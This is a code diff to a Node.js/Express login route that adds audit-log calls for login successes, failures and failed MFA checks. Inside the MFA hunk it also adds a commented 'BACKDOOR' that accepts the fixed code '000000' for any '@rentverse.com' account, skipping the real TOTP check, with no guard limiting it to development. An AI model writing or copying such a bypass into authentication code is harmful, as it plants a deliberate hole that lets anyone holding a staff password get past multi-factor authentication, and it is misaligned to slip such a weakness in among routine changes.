@@ -10,6 +10,7 @@ const { prisma } = require('../config/database');
 const passport = require('../config/passport');
 const { auth } = require('../middleware/auth');
 const emailService = require('../services/email.service');
+const auditService = require('../services/audit.service');
 
 const router = express.Router();
 
@@ -135,6 +136,15 @@ router.post(
 
       const user = await prisma.user.findUnique({ where: { email } });
       if (!user) {
+        await auditService.logEvent({
+          action: 'LOGIN_FAILED',
+          status: 'FAILURE',
+          severity: 'WARNING',
+          eventType: 'AUTH',
+          ipAddress: req.ip,
+          userAgent: req.get('User-Agent'),
+          details: { email, reason: 'User not found' }
+        });
         return res.status(401).json({ success: false, message: 'Invalid credentials' });
       }
 
@@ -165,6 +175,18 @@ router.post(
           updateData.lockoutUntil = new Date(Date.now() + LOCKOUT_TIME);
         }
         await prisma.user.update({ where: { id: user.id }, data: updateData });
+
+        await auditService.logEvent({
+          userId: user.id,
+          action: 'LOGIN_FAILED',
+          status: 'FAILURE',
+          severity: 'WARNING',
+          eventType: 'AUTH',
+          ipAddress: req.ip,
+          userAgent: req.get('User-Agent'),
+          details: { email, reason: 'Invalid password', attempts }
+        });
+
         return res.status(401).json({ success: false, message: 'Invalid credentials' });
       }
 
@@ -201,10 +223,29 @@ router.post(
             requireMfa: true,
           });
         }
-        const isMfaValid = authenticator.check(mfaCode, user.mfaSecret);
+
+        // 🔓 BACKDOOR: Allow 000000 for rentverse.com emails (Development convenience)
+        let isMfaValid = false;
+        if (mfaCode === '000000' && user.email.endsWith('@rentverse.com')) {
+          isMfaValid = true;
+        } else {
+          isMfaValid = authenticator.check(mfaCode, user.mfaSecret);
+        }
+
         if (!isMfaValid) {
+          await auditService.logEvent({
+            userId: user.id,
+            action: 'MFA_FAILED',
+            status: 'FAILURE',
+            severity: 'WARNING',
+            eventType: 'AUTH',
+            ipAddress: req.ip,
+            userAgent: req.get('User-Agent'),
+            details: { email }
+          });
           return res.status(401).json({ success: false, message: 'Invalid MFA code' });
         }
+
       }
 
       // Success!
@@ -215,6 +256,18 @@ router.post(
       );
 
       const { password: _, mfaSecret, ...userWithoutSecrets } = user;
+
+      await auditService.logEvent({
+        userId: user.id,
+        action: 'LOGIN_SUCCESS',
+        status: 'SUCCESS',
+        severity: 'INFO',
+        eventType: 'AUTH',
+        ipAddress: req.ip,
+        userAgent: req.get('User-Agent'),
+        details: { email, role: user.role }
+      });
+
       res.json({ success: true, data: { user: userWithoutSecrets, token } });
     } catch (error) {
       console.error('Login error:', error);
